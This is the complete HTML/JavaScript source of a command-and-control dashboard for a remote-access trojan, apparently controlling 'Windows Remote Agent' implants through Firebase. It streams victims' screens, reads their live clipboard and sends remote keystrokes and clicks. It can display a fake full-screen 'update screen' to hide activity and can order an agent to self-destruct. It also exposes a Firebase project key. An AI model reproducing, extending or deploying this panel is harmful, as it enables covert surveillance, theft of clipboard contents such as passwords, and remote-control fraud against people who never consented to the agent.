<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Multi-Device Admin Pro</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/lucide@latest"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-firestore-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/11.0.1/firebase-auth-compat.js"></script>
    <style>
        .device-card.active { border-color: #3b82f6; background: rgba(59, 130, 246, 0.1); }
        .online { background-color: #10b981; box-shadow: 0 0 8px #10b981; }
        #main-screen { max-height: 70vh; object-fit: contain; background: #000; border-radius: 12px; transition: opacity 0.3s; }
        .stream-off-overlay { background: rgba(15, 23, 42, 0.9); }
        .toggle-knob { transition: transform 0.2s cubic-bezier(0.4, 0, 0.2, 1); }
    </style>
</head>
<body class="bg-slate-950 text-slate-100 min-h-screen flex flex-col font-sans">

    <!-- Header / Nav -->
    <nav class="border-b border-slate-800 bg-slate-900/80 p-4 flex justify-between items-center sticky top-0 z-50">
        <div class="flex items-center gap-3">
            <div class="bg-blue-600 p-2 rounded-lg"><i data-lucide="shield-check" class="text-white w-5 h-5"></i></div>
            <h1 class="font-bold text-lg">Command <span class="text-blue-500">Center</span></h1>
        </div>
        
        <div id="active-device-display" class="hidden flex items-center gap-4">
            <!-- New Live Stream Toggle -->
            <div class="flex items-center gap-3 bg-slate-800/50 px-4 py-1.5 rounded-xl border border-slate-700">
                <span class="text-[10px] font-bold text-slate-400 uppercase tracking-widest">Live Stream</span>
                <button id="stream-toggle" onclick="toggleStream()" class="w-12 h-6 bg-slate-600 rounded-full relative transition-colors duration-300">
                    <div id="stream-knob" class="absolute top-1 left-1 w-4 h-4 bg-white rounded-full toggle-knob shadow-lg"></div>
                </button>
            </div>

            <div class="bg-slate-800 px-4 py-1.5 rounded-full border border-slate-700 flex items-center gap-2 shadow-inner">
                <span id="selected-device-id" class="text-xs font-mono text-blue-400 uppercase tracking-tighter">NONE</span>
                <span class="status-dot online w-2 h-2 rounded-full"></span>
            </div>
        </div>
    </nav>

    <div class="flex flex-1 overflow-hidden">
        <!-- Sidebar -->
        <aside class="w-64 border-r border-slate-800 bg-slate-900/30 flex flex-col">
            <div class="p-4 border-b border-slate-800 flex justify-between items-center text-[10px] font-bold text-slate-500 uppercase tracking-widest">
                Active Agents <span id="device-count" class="bg-slate-800 px-2 py-0.5 rounded text-blue-400">0</span>
            </div>
            <div id="device-list" class="flex-1 overflow-y-auto p-3 space-y-2"></div>
        </aside>

        <!-- Main Workspace -->
        <main class="flex-1 overflow-y-auto bg-slate-950 p-6 relative">
            <div id="no-device-screen" class="absolute inset-0 flex flex-col items-center justify-center text-slate-600 bg-slate-950">
                <i data-lucide="monitor-off" class="w-16 h-16 mb-4 opacity-10"></i>
                <p class="text-sm font-medium tracking-wide">Select an agent from the sidebar to begin control</p>
            </div>

            <div id="dashboard-content" class="hidden flex flex-col gap-6 h-full">
                <!-- Screen Feed -->
                <div class="flex-1 bg-slate-900 rounded-2xl border border-slate-800 overflow-hidden shadow-2xl flex flex-col relative group">
                    <div class="p-3 border-b border-slate-800 flex justify-between items-center bg-slate-900/50 backdrop-blur-sm">
                        <span class="text-[10px] font-bold text-blue-400 uppercase tracking-widest flex items-center gap-2">
                            <i data-lucide="monitor" class="w-3 h-3"></i> Remote Desktop Feed
                        </span>
                        <div class="text-[10px] text-slate-500 flex items-center gap-2 font-mono">
                             <span id="last-seen">Last Ping: Offline</span>
                        </div>
                    </div>
                    
                    <div id="screen-container" class="flex-1 flex items-center justify-center p-2 bg-black/60 relative overflow-hidden">
                        <img id="main-screen" class="max-w-full h-auto cursor-crosshair shadow-2xl z-10" src="" alt="" />
                        
                        <!-- Stream Off Overlay UI -->
                        <div id="stream-off-notice" class="absolute inset-0 stream-off-overlay flex flex-col items-center justify-center z-20 transition-all duration-500">
                            <div class="p-8 rounded-full bg-slate-900/50 border border-slate-800 mb-4">
                                <i data-lucide="eye-off" class="w-12 h-12 text-slate-600"></i>
                            </div>
                            <p class="text-slate-400 text-sm font-bold uppercase tracking-[0.2em]">Stream is Paused</p>
                            <p class="text-slate-600 text-[10px] mt-2 font-medium">Enable the <span class="text-blue-500">Live Stream</span> toggle to see remote screen</p>
                        </div>
                    </div>
                </div>

                <!-- Control Bar -->
                <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
                    <!-- Typing & Function Keys -->
                    <div class="md:col-span-2 bg-slate-900 p-5 rounded-2xl border border-slate-800 space-y-4 shadow-xl">
                        <div class="flex gap-3">
                            <input type="text" id="kb-input" placeholder="Type message or text to send..." class="flex-1 bg-slate-950 border border-slate-700 rounded-xl px-4 py-3 focus:outline-none focus:border-blue-500 text-sm transition-all" />
                            <button onclick="handleKeyboard()" class="bg-blue-600 hover:bg-blue-500 px-8 rounded-xl font-bold text-sm transition-all shadow-lg shadow-blue-900/20 active:scale-95">SEND</button>
                        </div>
                        <div class="flex flex-wrap gap-2">
                            <button onclick="sendCmd({type:'key', key:'enter'})" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest border border-slate-700/50 transition-colors">ENTER</button>
                            <button onclick="sendCmd({type:'key', key:'backspace'})" class="bg-slate-800 hover:bg-slate-700 px-4 py-2 rounded-lg text-[10px] font-bold uppercase tracking-widest border border-slate-700/50 transition-colors">BACKSPACE</button>
                            <div class="w-[1px] bg-slate-700 mx-2"></div>
                            <button id="update-btn" onclick="toggleUpdateScreen(true)" class="bg-orange-600/10 hover:bg-orange-600/20 text-orange-500 px-5 py-2 rounded-lg text-[10px] font-bold border border-orange-500/20 flex items-center gap-2 transition-all">
                                <i data-lucide="refresh-cw" class="w-3 h-3"></i> SHOW UPDATE SCREEN
                            </button>
                            <button id="stop-update-btn" onclick="toggleUpdateScreen(false)" class="hidden bg-slate-800 hover:bg-slate-700 text-white px-5 py-2 rounded-lg text-[10px] font-bold border border-slate-700 flex items-center gap-2 transition-all">
                                HIDE UPDATE SCREEN
                            </button>
                        </div>
                    </div>

                    <!-- Clipboard & Destruct -->
                    <div class="bg-slate-900 p-5 rounded-2xl border border-slate-800 flex flex-col shadow-xl">
                        <div class="flex justify-between items-center mb-3">
                            <span class="text-[10px] font-bold uppercase text-slate-500 tracking-wider">Live Clipboard</span>
                            <button onclick="copyCurrentClip()" class="text-blue-500 hover:text-blue-400 transition-colors"><i data-lucide="copy" class="w-4 h-4"></i></button>
                        </div>
                        <div id="clip-text" class="text-xs font-mono text-blue-400 break-all bg-slate-950 p-3 rounded-lg border border-slate-800 flex-1 min-h-[50px] mb-3 overflow-y-auto shadow-inner">
                            Waiting for data...
                        </div>
                        <button onclick="triggerDestruct()" class="w-full bg-red-600/10 hover:bg-red-600 text-red-500 hover:text-white py-2 rounded-xl text-[10px] font-bold border border-red-500/20 transition-all uppercase tracking-widest active:scale-95">
                            Self Destruct Agent
                        </button>
                    </div>
                </div>
            </div>
        </main>
    </div>

    <script>
// For Firebase JS SDK v7.20.0 and later, measurementId is optional
const firebaseConfig = {
  apiKey: "AIzaSyDYbGLAXKaY9uVyNPDCS-bvxsQvPWiLouk",
  authDomain: "sainfoxiya-com-a7733.firebaseapp.com",
  databaseURL: "https://sainfoxiya-com-a7733-default-rtdb.firebaseio.com",
  projectId: "sainfoxiya-com-a7733",
  storageBucket: "sainfoxiya-com-a7733.firebasestorage.app",
  messagingSenderId: "639762867502",
  appId: "1:639762867502:web:826662477ce123110fc6bf",
 
};

        const APP_ID = 'sainfoxiya-com-a7733';
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        const auth = firebase.auth();

        let selectedDevice = null;
        let unsubscribeDevice = null;
        let isStreamOn = false;

        async function initDashboard() {
            try {
                await auth.signInAnonymously();
                db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices')
                .onSnapshot(snapshot => {
                    const list = document.getElementById('device-list');
                    document.getElementById('device-count').innerText = snapshot.size;
                    list.innerHTML = '';
                    snapshot.forEach(doc => {
                        const div = document.createElement('div');
                        div.className = `p-4 rounded-xl border border-slate-800 bg-slate-900/50 cursor-pointer transition-all hover:border-slate-600 ${selectedDevice === doc.id ? 'active' : ''}`;
                        div.onclick = () => selectDevice(doc.id);
                        div.innerHTML = `
                            <div class="flex justify-between items-center text-xs font-bold mb-1">
                                <span class="truncate pr-2">${doc.id}</span>
                                <span class="status-dot online w-2 h-2 rounded-full"></span>
                            </div>
                            <div class="text-[9px] text-slate-500 uppercase tracking-tighter">Windows Remote Agent</div>
                        `;
                        list.appendChild(div);
                    });
                });
            } catch (e) { console.error("Firebase Init Error:", e); }
        }

        function selectDevice(deviceId) {
            selectedDevice = deviceId;
            document.getElementById('selected-device-id').innerText = deviceId;
            document.getElementById('active-device-display').classList.remove('hidden');
            document.getElementById('no-device-screen').classList.add('hidden');
            document.getElementById('dashboard-content').classList.remove('hidden');
            
            if (unsubscribeDevice) unsubscribeDevice();
            unsubscribeDevice = db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(deviceId)
            .onSnapshot(doc => { if(doc.exists) updateUI(doc.data()); });
            
            // Highlight current selection
            document.querySelectorAll('#device-list > div').forEach(el => el.classList.remove('active'));
        }

        function updateUI(data) {
            isStreamOn = data.stream_on || false;
            
            // Toggle Logic
            const knob = document.getElementById('stream-knob');
            const bg = document.getElementById('stream-toggle');
            const notice = document.getElementById('stream-off-notice');
            
            if (isStreamOn) {
                knob.style.transform = 'translateX(24px)';
                bg.classList.replace('bg-slate-600', 'bg-blue-600');
                notice.classList.add('opacity-0', 'pointer-events-none');
                setTimeout(() => notice.classList.add('hidden'), 500);
            } else {
                knob.style.transform = 'translateX(0)';
                bg.classList.replace('bg-blue-600', 'bg-slate-600');
                notice.classList.remove('hidden');
                setTimeout(() => notice.classList.remove('opacity-0', 'pointer-events-none'), 50);
                document.getElementById('main-screen').src = '';
            }

            if (data.screen && isStreamOn) {
                document.getElementById('main-screen').src = 'data:image/jpeg;base64,' + data.screen;
                document.getElementById('main-screen').style.opacity = '1';
            }
            
            if (data.clipboard) {
                document.getElementById('clip-text').innerText = data.clipboard;
            }
            
            if (data.last_online) {
                const date = data.last_online.toDate();
                document.getElementById('last-seen').innerText = "Last Ping: " + date.toLocaleTimeString();
            }
            
            const isUpdating = data.command && data.command.type === 'show_html';
            document.getElementById('update-btn').style.display = isUpdating ? 'none' : 'block';
            document.getElementById('stop-update-btn').style.display = isUpdating ? 'block' : 'none';
        }

        function toggleStream() {
            if (!selectedDevice) return;
            db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(selectedDevice).update({
                stream_on: !isStreamOn
            });
        }

        async function sendCmd(cmd) {
            if (!selectedDevice) return;
            try {
                await db.collection('artifacts').doc(APP_ID).collection('public').doc('data').collection('devices').doc(selectedDevice).update({
                    command: { ...cmd, timestamp: Date.now() }
                });
            } catch(e) { console.error("Command Error:", e); }
        }

        function toggleUpdateScreen(active) {
            sendCmd({ type: active ? 'show_html' : 'hide_html' });
        }

        function handleKeyboard() {
            const input = document.getElementById('kb-input');
            if (input.value) { 
                sendCmd({ type: 'type', text: input.value }); 
                input.value = ''; 
            }
        }

        function triggerDestruct() {
            if (confirm("Khatra: Agent ko permanent delete kar dein? Is process ko roka nahi ja sakta.")) {
                sendCmd({ type: 'self_destruct' });
                window.location.reload();
            }
        }

        function copyCurrentClip() {
            const text = document.getElementById('clip-text').innerText;
            const el = document.createElement('textarea');
            el.value = text;
            document.body.appendChild(el);
            el.select();
            document.execCommand('copy');
            document.body.removeChild(el);
        }

        // Screen Interaction
        document.getElementById('main-screen').addEventListener('click', (e) => {
            if (!selectedDevice || !isStreamOn) return;
            const rect = e.target.getBoundingClientRect();
            const x = (e.clientX - rect.left) / rect.width;
            const y = (e.clientY - rect.top) / rect.height;
            sendCmd({ type: 'click', x, y });
        });

        lucide.createIcons();
        initDashboard();
    </script>
</body>
</html>
